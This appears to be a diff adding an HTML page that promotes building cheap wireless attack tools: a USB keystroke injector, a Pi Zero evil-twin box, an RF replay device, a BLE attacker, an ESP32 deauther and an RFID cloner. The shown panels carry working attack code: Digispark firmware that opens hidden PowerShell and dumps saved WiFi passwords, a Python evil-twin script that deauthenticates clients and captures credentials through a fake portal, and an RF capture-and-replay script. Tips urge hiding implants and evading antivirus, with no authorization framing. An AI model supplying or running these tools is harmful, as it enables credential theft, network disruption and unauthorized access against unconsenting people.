@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Custom Wireless Hacking Tools</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Bebas+Neue&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #080b10;
+  --surface: #0d1117;
+  --surface2: #111820;
+  --border: #1c2a3a;
+  --text: #b0bec5;
+  --text-bright: #eceff1;
+  --muted: #546e7a;
+  --green: #69f0ae;
+  --blue: #4fc3f7;
+  --orange: #ff7043;
+  --purple: #ce93d8;
+  --yellow: #ffee58;
+  --red: #ff5252;
+  --cyan: #00e5ff;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Barlow', sans-serif;
+  font-size: 15px;
+  line-height: 1.7;
+  padding: 40px 24px 80px;
+}
+.container { max-width: 960px; margin: 0 auto; }
+
+/* Header */
+.header {
+  text-align: center;
+  margin-bottom: 48px;
+}
+.eyebrow {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  letter-spacing: 4px;
+  margin-bottom: 12px;
+}
+.title {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: clamp(36px, 6vw, 64px);
+  color: var(--text-bright);
+  letter-spacing: 3px;
+  line-height: 1;
+  margin-bottom: 12px;
+}
+.title span { color: var(--green); }
+.subtitle {
+  color: var(--muted);
+  font-size: 14px;
+  font-weight: 300;
+  max-width: 500px;
+  margin: 0 auto;
+}
+.header-line {
+  margin-top: 24px;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, var(--green), transparent);
+  opacity: 0.3;
+}
+
+/* Tool cards grid */
+.tools-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 16px;
+  margin-bottom: 48px;
+}
+
+.tool-card {
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  cursor: pointer;
+  transition: all 0.25s;
+  position: relative;
+  background: var(--surface);
+}
+.tool-card:hover { transform: translateY(-3px); border-color: var(--card-color); box-shadow: 0 8px 30px rgba(0,0,0,0.4); }
+.tool-card.selected { border-color: var(--card-color); background: var(--surface2); box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+.tool-card.selected::before {
+  content: '✓ SELECTED';
+  position: absolute;
+  top: 10px; right: 10px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9px;
+  color: var(--card-color);
+  letter-spacing: 2px;
+  background: var(--bg);
+  padding: 3px 8px;
+  border: 1px solid var(--card-color);
+  border-radius: 2px;
+}
+
+.card-top {
+  padding: 20px 20px 14px;
+  border-bottom: 1px solid var(--border);
+  border-left: 4px solid var(--card-color);
+}
+.card-icon { font-size: 28px; margin-bottom: 10px; }
+.card-name {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 22px;
+  color: var(--card-color);
+  letter-spacing: 1px;
+  line-height: 1;
+  margin-bottom: 4px;
+}
+.card-tagline {
+  font-size: 12px;
+  color: var(--muted);
+  font-family: 'JetBrains Mono', monospace;
+}
+
+.card-body { padding: 14px 20px; }
+.card-desc { font-size: 13px; color: var(--text); line-height: 1.6; margin-bottom: 12px; font-weight: 300; }
+
+.card-meta {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-bottom: 10px;
+}
+.meta-badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  padding: 3px 8px;
+  border-radius: 2px;
+  border: 1px solid;
+}
+.badge-cost { color: var(--green); border-color: rgba(105,240,174,0.3); background: rgba(105,240,174,0.06); }
+.badge-lang { color: var(--blue); border-color: rgba(79,195,247,0.3); background: rgba(79,195,247,0.06); }
+.badge-hw { color: var(--orange); border-color: rgba(255,112,67,0.3); background: rgba(255,112,67,0.06); }
+.badge-diff { border: 1px solid; }
+.diff-easy { color: var(--green); border-color: rgba(105,240,174,0.3); background: rgba(105,240,174,0.06); }
+.diff-med { color: var(--yellow); border-color: rgba(255,238,88,0.3); background: rgba(255,238,88,0.06); }
+.diff-hard { color: var(--red); border-color: rgba(255,82,82,0.3); background: rgba(255,82,82,0.06); }
+
+.card-what {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: 2px;
+  margin-bottom: 6px;
+}
+.card-attacks {
+  display: flex;
+  flex-direction: column;
+  gap: 3px;
+}
+.attack-item {
+  font-size: 12px;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.attack-item::before {
+  content: '▸';
+  color: var(--card-color);
+  font-size: 9px;
+}
+
+/* Detail panel */
+.detail-panel {
+  display: none;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  margin-bottom: 32px;
+  overflow: hidden;
+  animation: slideDown 0.3s ease;
+}
+.detail-panel.active { display: block; }
+
+@keyframes slideDown {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.detail-header {
+  padding: 20px 28px;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  background: var(--surface);
+}
+.detail-title {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 28px;
+  letter-spacing: 2px;
+}
+.detail-close {
+  margin-left: auto;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  cursor: pointer;
+  padding: 6px 12px;
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  transition: all 0.2s;
+}
+.detail-close:hover { color: var(--text-bright); border-color: var(--text); }
+
+.detail-body { padding: 24px 28px; background: rgba(0,0,0,0.3); }
+
+.detail-cols {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 24px;
+  margin-bottom: 24px;
+}
+
+.section-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--muted);
+  letter-spacing: 3px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 6px;
+  margin-bottom: 12px;
+}
+
+.shopping-list {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.shop-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 8px 12px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  font-size: 13px;
+}
+.shop-name { color: var(--text-bright); font-weight: 500; }
+.shop-price { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green); }
+.shop-total {
+  display: flex;
+  justify-content: space-between;
+  padding: 8px 12px;
+  border-top: 1px dashed var(--border);
+  margin-top: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--green);
+}
+
+.code-block {
+  background: #020810;
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--panel-color, var(--green));
+  border-radius: 4px;
+  padding: 16px 18px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  line-height: 1.9;
+  overflow-x: auto;
+  margin: 10px 0;
+}
+.c-cmd { color: var(--green); }
+.c-comment { color: var(--muted); }
+.c-str { color: var(--yellow); }
+.c-kw { color: var(--purple); }
+.c-num { color: var(--orange); }
+.c-fn { color: var(--blue); }
+.c-out { color: var(--cyan); }
+
+.step-list {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+.step-item {
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+}
+.step-n {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--panel-color, var(--green));
+  background: rgba(105,240,174,0.08);
+  border: 1px solid rgba(105,240,174,0.2);
+  border-radius: 50%;
+  width: 24px;
+  height: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+.step-text { font-size: 13px; color: var(--text); line-height: 1.55; }
+.step-text strong { color: var(--text-bright); }
+
+.alert-tip {
+  border: 1px solid rgba(105,240,174,0.25);
+  background: rgba(105,240,174,0.05);
+  border-radius: 4px;
+  padding: 12px 16px;
+  font-size: 13px;
+  color: var(--green);
+  margin-top: 16px;
+  line-height: 1.6;
+  display: flex;
+  gap: 10px;
+}
+.alert-tip-icon {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  flex-shrink: 0;
+  margin-top: 2px;
+  letter-spacing: 1px;
+}
+
+/* Comparison table */
+.compare-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-top: 8px;
+  font-size: 13px;
+}
+.compare-table th {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 9px;
+  color: var(--muted);
+  letter-spacing: 2px;
+  padding: 8px 12px;
+  border-bottom: 1px solid var(--border);
+  text-align: left;
+}
+.compare-table td {
+  padding: 10px 12px;
+  border-bottom: 1px solid rgba(28,42,58,0.5);
+  vertical-align: middle;
+}
+.compare-table tr:last-child td { border-bottom: none; }
+.compare-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+/* Tabs */
+.tabs {
+  display: flex;
+  gap: 2px;
+  margin-bottom: 0;
+  border-bottom: 1px solid var(--border);
+}
+.tab {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  padding: 10px 18px;
+  cursor: pointer;
+  color: var(--muted);
+  border-bottom: 2px solid transparent;
+  transition: all 0.2s;
+  letter-spacing: 1px;
+}
+.tab:hover { color: var(--text-bright); }
+.tab.active { color: var(--tab-color, var(--green)); border-bottom-color: var(--tab-color, var(--green)); }
+.tab-content { display: none; padding-top: 20px; }
+.tab-content.active { display: block; }
+
+@media (max-width: 600px) {
+  .detail-cols { grid-template-columns: 1fr; }
+  .tools-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <div class="eyebrow">// BUILD YOUR OWN</div>
+    <div class="title">CUSTOM <span>WIRELESS</span><br>HACKING TOOLS</div>
+    <div class="subtitle">Every tool you see hackers use online — you can build your own version. Here's how.</div>
+    <div class="header-line"></div>
+  </div>
+
+  <!-- Tool selection cards -->
+  <div class="tools-grid">
+
+    <div class="tool-card" style="--card-color:#ff7043" onclick="showDetail('rubber')">
+      <div class="card-top">
+        <div class="card-icon">🦆</div>
+        <div class="card-name">USB Rubber Ducky</div>
+        <div class="card-tagline">// Keystroke injection attack</div>
+      </div>
+      <div class="card-body">
+        <div class="card-desc">Plug in, automatically types malicious commands as if it's a keyboard. Bypasses most security. You can build one with a $4 Digispark.</div>
+        <div class="card-meta">
+          <span class="meta-badge badge-cost">~$4 DIY</span>
+          <span class="meta-badge badge-lang">Python + Ducky Script</span>
+          <span class="meta-badge badge-diff diff-easy">EASY</span>
+        </div>
+        <div class="card-what">// WHAT IT DOES</div>
+        <div class="card-attacks">
+          <div class="attack-item">Opens reverse shell on target PC</div>
+          <div class="attack-item">Dumps saved WiFi passwords</div>
+          <div class="attack-item">Installs backdoor in seconds</div>
+          <div class="attack-item">Exfiltrates files to USB</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tool-card" style="--card-color:#4fc3f7" onclick="showDetail('pizero')">
+      <div class="card-top">
+        <div class="card-icon">🥧</div>
+        <div class="card-name">Pi Zero WiFi Attack Box</div>
+        <div class="card-tagline">// Wireless network hacking implant</div>
+      </div>
+      <div class="card-body">
+        <div class="card-desc">Raspberry Pi Zero W running custom Python scripts. Tiny, battery-powered, drop-and-forget wireless attack platform. Build your own WiFi Pineapple.</div>
+        <div class="card-meta">
+          <span class="meta-badge badge-cost">~$15–25</span>
+          <span class="meta-badge badge-lang">Python + Bash</span>
+          <span class="meta-badge badge-diff diff-med">MEDIUM</span>
+        </div>
+        <div class="card-what">// WHAT IT DOES</div>
+        <div class="card-attacks">
+          <div class="attack-item">Evil twin WiFi access point</div>
+          <div class="attack-item">Deauth attacks (disconnect clients)</div>
+          <div class="attack-item">Capture WPA handshakes</div>
+          <div class="attack-item">Man-in-the-middle on LAN</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tool-card" style="--card-color:#ce93d8" onclick="showDetail('rf433')">
+      <div class="card-top">
+        <div class="card-icon">📡</div>
+        <div class="card-name">RF Replay Tool</div>
+        <div class="card-tagline">// 433 MHz signal capture & replay</div>
+      </div>
+      <div class="card-body">
+        <div class="card-desc">Custom Python script + $2 RF module. Capture any 433 MHz signal (garage doors, remotes, sensors), decode it, replay it. DIY Flipper Zero on a budget.</div>
+        <div class="card-meta">
+          <span class="meta-badge badge-cost">~$8 DIY</span>
+          <span class="meta-badge badge-lang">Python + C</span>
+          <span class="meta-badge badge-diff diff-easy">EASY</span>
+        </div>
+        <div class="card-what">// WHAT IT DOES</div>
+        <div class="card-attacks">
+          <div class="attack-item">Capture & decode RF signals</div>
+          <div class="attack-item">Replay to trigger devices</div>
+          <div class="attack-item">Brute-force rolling codes</div>
+          <div class="attack-item">Analyze unknown protocols</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tool-card" style="--card-color:#69f0ae" onclick="showDetail('ble')">
+      <div class="card-top">
+        <div class="card-icon">🔵</div>
+        <div class="card-name">BLE Scanner & Attacker</div>
+        <div class="card-tagline">// Bluetooth Low Energy hacking</div>
+      </div>
+      <div class="card-body">
+        <div class="card-desc">Pure Python script using your laptop's Bluetooth. Scan, enumerate, and interact with BLE devices like smart locks, fitness bands, IoT sensors. No extra hardware needed.</div>
+        <div class="card-meta">
+          <span class="meta-badge badge-cost">$0 — use laptop BT</span>
+          <span class="meta-badge badge-lang">Python</span>
+          <span class="meta-badge badge-diff diff-easy">EASY START</span>
+        </div>
+        <div class="card-what">// WHAT IT DOES</div>
+        <div class="card-attacks">
+          <div class="attack-item">Enumerate nearby BLE devices</div>
+          <div class="attack-item">Read GATT characteristics</div>
+          <div class="attack-item">Send unauthorized commands</div>
+          <div class="attack-item">Track BLE device movement</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tool-card" style="--card-color:#ffee58" onclick="showDetail('esp32')">
+      <div class="card-top">
+        <div class="card-icon">⚡</div>
+        <div class="card-name">ESP32 WiFi Deauther</div>
+        <div class="card-tagline">// Pocket WiFi attack device</div>
+      </div>
+      <div class="card-body">
+        <div class="card-desc">Flash custom firmware onto a $3 ESP32. Standalone device with no laptop needed. Scan networks, send deauth frames, create evil twins, capture handshakes.</div>
+        <div class="card-meta">
+          <span class="meta-badge badge-cost">~$3–5</span>
+          <span class="meta-badge badge-lang">C++ / Arduino</span>
+          <span class="meta-badge badge-diff diff-med">MEDIUM</span>
+        </div>
+        <div class="card-what">// WHAT IT DOES</div>
+        <div class="card-attacks">
+          <div class="attack-item">WiFi network scanner</div>
+          <div class="attack-item">Deauthentication attack</div>
+          <div class="attack-item">Fake AP / Evil twin</div>
+          <div class="attack-item">Beacon flood attack</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tool-card" style="--card-color:#ff5252" onclick="showDetail('rfid')">
+      <div class="card-top">
+        <div class="card-icon">💳</div>
+        <div class="card-name">RFID / NFC Cloner</div>
+        <div class="card-tagline">// Access card cloning tool</div>
+      </div>
+      <div class="card-body">
+        <div class="card-desc">Custom script + $5 MFRC522 module. Read access cards, clone them to blank cards, write custom UIDs. Build a DIY Proxmark on a budget.</div>
+        <div class="card-meta">
+          <span class="meta-badge badge-cost">~$5–10</span>
+          <span class="meta-badge badge-lang">Python + SPI</span>
+          <span class="meta-badge badge-diff diff-easy">EASY</span>
+        </div>
+        <div class="card-what">// WHAT IT DOES</div>
+        <div class="card-attacks">
+          <div class="attack-item">Read MIFARE / NFC cards</div>
+          <div class="attack-item">Clone card UID to blank</div>
+          <div class="attack-item">Dump card memory blocks</div>
+          <div class="attack-item">Write custom card data</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Detail panels -->
+
+  <!-- RUBBER DUCKY -->
+  <div class="detail-panel" id="detail-rubber" style="--panel-color:#ff7043">
+    <div class="detail-header" style="border-left: 4px solid #ff7043">
+      <span style="font-size:24px">🦆</span>
+      <div class="detail-title" style="color:#ff7043">DIY USB RUBBER DUCKY</div>
+      <div class="detail-close" onclick="closeDetail('rubber')">✕ CLOSE</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-cols">
+        <div>
+          <div class="section-label">// SHOPPING LIST</div>
+          <div class="shopping-list">
+            <div class="shop-item"><span class="shop-name">Digispark ATtiny85</span><span class="shop-price">~$2–4</span></div>
+            <div class="shop-item"><span class="shop-name">USB-A cable (short)</span><span class="shop-price">~$1</span></div>
+            <div class="shop-item"><span class="shop-name">Arduino IDE (free)</span><span class="shop-price">$0</span></div>
+            <div class="shop-total"><span>TOTAL BUILD COST</span><span>~$4</span></div>
+          </div>
+          <div class="alert-tip" style="margin-top:14px">
+            <div class="alert-tip-icon">✓</div>
+            <div>Digispark looks exactly like a USB flash drive to any PC. Windows/Linux/Mac auto-installs it as a keyboard — bypasses every AV.</div>
+          </div>
+        </div>
+        <div>
+          <div class="section-label">// HOW IT WORKS</div>
+          <div class="step-list">
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,112,67,0.3);background:rgba(255,112,67,0.08);color:#ff7043">1</div>
+              <div class="step-text">Plug in → PC sees it as a <strong>USB HID Keyboard</strong></div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,112,67,0.3);background:rgba(255,112,67,0.08);color:#ff7043">2</div>
+              <div class="step-text">Automatically types your <strong>payload script</strong> at 1000 chars/sec</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,112,67,0.3);background:rgba(255,112,67,0.08);color:#ff7043">3</div>
+              <div class="step-text">Opens PowerShell/Terminal, runs commands, done in <strong>under 3 seconds</strong></div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(255,112,67,0.3);background:rgba(255,112,67,0.08);color:#ff7043">4</div>
+              <div class="step-text">Unplug — <strong>no trace left</strong> on the device itself</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section-label">// SAMPLE PAYLOAD — DUMP WIFI PASSWORDS (Windows)</div>
+      <div class="code-block" style="--panel-color:#ff7043">
+        <span class="c-comment">// Arduino code for Digispark — runs on plug-in</span><br>
+        <span class="c-kw">#include</span> <span class="c-str">&lt;DigiKeyboard.h&gt;</span><br><br>
+        <span class="c-kw">void</span> <span class="c-fn">setup</span>() {<br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">delay</span>(<span class="c-num">2000</span>);  <span class="c-comment">// wait for PC to recognise device</span><br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);  <span class="c-comment">// Win+R</span><br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">delay</span>(<span class="c-num">500</span>);<br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">print</span>(<span class="c-str">"powershell -w hidden"</span>);<br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">sendKeyStroke</span>(KEY_ENTER);<br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">delay</span>(<span class="c-num">1000</span>);<br>
+        &nbsp;&nbsp;<span class="c-comment">// Dump all saved WiFi passwords</span><br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">print</span>(<span class="c-str">"(netsh wlan show profiles) | Select-String ':(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name=$n key=clear)} | Select-String 'Key Content\\W+:\\W+(.+)$' | %{$_.Matches.Groups[1].Value}"</span>);<br>
+        &nbsp;&nbsp;DigiKeyboard.<span class="c-fn">sendKeyStroke</span>(KEY_ENTER);<br>
+        }<br>
+        <span class="c-kw">void</span> <span class="c-fn">loop</span>() {}  <span class="c-comment">// runs once only</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- PI ZERO -->
+  <div class="detail-panel" id="detail-pizero" style="--panel-color:#4fc3f7">
+    <div class="detail-header" style="border-left: 4px solid #4fc3f7">
+      <span style="font-size:24px">🥧</span>
+      <div class="detail-title" style="color:#4fc3f7">PI ZERO WIFI ATTACK BOX</div>
+      <div class="detail-close" onclick="closeDetail('pizero')">✕ CLOSE</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-cols">
+        <div>
+          <div class="section-label">// SHOPPING LIST</div>
+          <div class="shopping-list">
+            <div class="shop-item"><span class="shop-name">Raspberry Pi Zero 2W</span><span class="shop-price">~$15</span></div>
+            <div class="shop-item"><span class="shop-name">MicroSD card 16GB</span><span class="shop-price">~$5</span></div>
+            <div class="shop-item"><span class="shop-name">Small LiPo battery</span><span class="shop-price">~$5</span></div>
+            <div class="shop-item"><span class="shop-name">USB WiFi adapter (monitor mode)</span><span class="shop-price">~$8</span></div>
+            <div class="shop-total"><span>TOTAL BUILD COST</span><span>~$33</span></div>
+          </div>
+        </div>
+        <div>
+          <div class="section-label">// SETUP STEPS</div>
+          <div class="step-list">
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(79,195,247,0.3);background:rgba(79,195,247,0.08);color:#4fc3f7">1</div>
+              <div class="step-text">Flash <strong>Kali Linux ARM</strong> onto the microSD</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(79,195,247,0.3);background:rgba(79,195,247,0.08);color:#4fc3f7">2</div>
+              <div class="step-text">Enable SSH over USB — control it from your phone</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(79,195,247,0.3);background:rgba(79,195,247,0.08);color:#4fc3f7">3</div>
+              <div class="step-text">Install <strong>aircrack-ng, hostapd, dnsmasq</strong></div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(79,195,247,0.3);background:rgba(79,195,247,0.08);color:#4fc3f7">4</div>
+              <div class="step-text">Write Python script to auto-run attack on boot</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section-label">// EVIL TWIN ATTACK SCRIPT (Python)</div>
+      <div class="code-block" style="--panel-color:#4fc3f7">
+        <span class="c-comment">#!/usr/bin/env python3</span><br>
+        <span class="c-comment"># Evil Twin AP — captures WiFi credentials via fake portal</span><br><br>
+        <span class="c-kw">import</span> os, subprocess, time<br><br>
+        TARGET_SSID = <span class="c-str">"TargetNetwork"</span>   <span class="c-comment"># SSID to clone</span><br>
+        IFACE = <span class="c-str">"wlan1"</span>              <span class="c-comment"># monitor mode interface</span><br><br>
+        <span class="c-kw">def</span> <span class="c-fn">start_evil_twin</span>(ssid):<br>
+        &nbsp;&nbsp;<span class="c-comment"># Put interface in monitor mode</span><br>
+        &nbsp;&nbsp;os.<span class="c-fn">system</span>(<span class="c-str">f"airmon-ng start {IFACE}"</span>)<br>
+        &nbsp;&nbsp;<span class="c-comment"># Deauth clients from real AP</span><br>
+        &nbsp;&nbsp;os.<span class="c-fn">system</span>(<span class="c-str">f"aireplay-ng --deauth 0 -a [BSSID] {IFACE}mon &"</span>)<br>
+        &nbsp;&nbsp;<span class="c-comment"># Start fake AP with same SSID</span><br>
+        &nbsp;&nbsp;os.<span class="c-fn">system</span>(<span class="c-str">f"hostapd /tmp/evil_twin.conf &"</span>)<br>
+        &nbsp;&nbsp;<span class="c-comment"># Start captive portal to capture creds</span><br>
+        &nbsp;&nbsp;os.<span class="c-fn">system</span>(<span class="c-str">"python3 captive_portal.py &"</span>)<br>
+        &nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[+] Evil twin '{ssid}' running. Waiting for victims..."</span>)<br><br>
+        <span class="c-kw">def</span> <span class="c-fn">capture_handshake</span>():<br>
+        &nbsp;&nbsp;os.<span class="c-fn">system</span>(<span class="c-str">f"airodump-ng -w /tmp/capture --bssid [BSSID] {IFACE}mon"</span>)<br><br>
+        <span class="c-fn">start_evil_twin</span>(TARGET_SSID)
+      </div>
+      <div class="alert-tip">
+        <div class="alert-tip-icon">✓ TIP</div>
+        <div>The Pi Zero W is literally the size of a credit card. Hide it behind a power outlet, inside a book, anywhere. Runs for 4–6 hours on a small LiPo battery. This is exactly what the commercial WiFi Pineapple does — costs $100+, yours costs $33.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RF 433 -->
+  <div class="detail-panel" id="detail-rf433" style="--panel-color:#ce93d8">
+    <div class="detail-header" style="border-left: 4px solid #ce93d8">
+      <span style="font-size:24px">📡</span>
+      <div class="detail-title" style="color:#ce93d8">DIY RF REPLAY TOOL</div>
+      <div class="detail-close" onclick="closeDetail('rf433')">✕ CLOSE</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-cols">
+        <div>
+          <div class="section-label">// SHOPPING LIST</div>
+          <div class="shopping-list">
+            <div class="shop-item"><span class="shop-name">433MHz RX/TX module pair</span><span class="shop-price">~$2</span></div>
+            <div class="shop-item"><span class="shop-name">Arduino Nano / ESP32</span><span class="shop-price">~$3–5</span></div>
+            <div class="shop-item"><span class="shop-name">Jumper wires</span><span class="shop-price">~$1</span></div>
+            <div class="shop-item"><span class="shop-name">17cm wire antenna (DIY)</span><span class="shop-price">$0</span></div>
+            <div class="shop-total"><span>TOTAL BUILD COST</span><span>~$6–8</span></div>
+          </div>
+        </div>
+        <div>
+          <div class="section-label">// HOW REPLAY ATTACK WORKS</div>
+          <div class="step-list">
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(206,147,216,0.3);background:rgba(206,147,216,0.08);color:#ce93d8">1</div>
+              <div class="step-text">RX module <strong>listens</strong> on 433.92 MHz</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(206,147,216,0.3);background:rgba(206,147,216,0.08);color:#ce93d8">2</div>
+              <div class="step-text">Target presses remote → <strong>Arduino captures the binary sequence</strong></div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(206,147,216,0.3);background:rgba(206,147,216,0.08);color:#ce93d8">3</div>
+              <div class="step-text">Save sequence to memory or send over serial to Python script</div>
+            </div>
+            <div class="step-item">
+              <div class="step-n" style="border-color:rgba(206,147,216,0.3);background:rgba(206,147,216,0.08);color:#ce93d8">4</div>
+              <div class="step-text">TX module <strong>replays</strong> the exact same sequence → device triggers</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section-label">// CUSTOM PYTHON RF CAPTURE + REPLAY SCRIPT</div>
+      <div class="code-block" style="--panel-color:#ce93d8">
+        <span class="c-comment">#!/usr/bin/env python3</span><br>
+        <span class="c-comment"># RF Capture & Replay — connects to Arduino over serial</span><br>
+        <span class="c-kw">import</span> serial, time, json, sys<br><br>
+        <span class="c-kw">class</span> <span class="c-fn">RFCapture</span>:<br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">__init__</span>(self, port=<span class="c-str">"/dev/ttyUSB0"</span>, baud=<span class="c-num">115200</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.ser = serial.<span class="c-fn">Serial</span>(port, baud, timeout=<span class="c-num">2</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.signals = []<br><br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">capture</span>(self, duration=<span class="c-num">10</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[*] Listening for RF signals for {duration}s..."</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;self.ser.<span class="c-fn">write</span>(<span class="c-str">b"CAPTURE\n"</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;start = time.<span class="c-fn">time</span>()<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">while</span> time.<span class="c-fn">time</span>() - start &lt; duration:<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;line = self.ser.readline().<span class="c-fn">decode</span>().<span class="c-fn">strip</span>()<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">if</span> line.<span class="c-fn">startswith</span>(<span class="c-str">"SIG:"</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sig = line[<span class="c-num">4</span>:]<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.signals.<span class="c-fn">append</span>(sig)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[+] Captured: {sig[:40]}..."</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">return</span> self.signals<br><br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">replay</span>(self, signal, repeat=<span class="c-num">3</span>):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">f"[*] Replaying signal {repeat}x..."</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-kw">for</span> i <span class="c-kw">in</span> <span class="c-fn">range</span>(repeat):<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.ser.<span class="c-fn">write</span>(<span class="c-str">f"REPLAY:{signal}\n"</span>.<span class="c-fn">encode</span>())<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.<span class="c-fn">sleep</span>(<span class="c-num">0.5</span>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">"[+] Done. Device should have triggered."</span>)<br><br>
+        &nbsp;&nbsp;<span class="c-kw">def</span> <span class="c-fn">save</span>(self, filename=<span class="c-str">"captured_signals.json"</span>):<br>
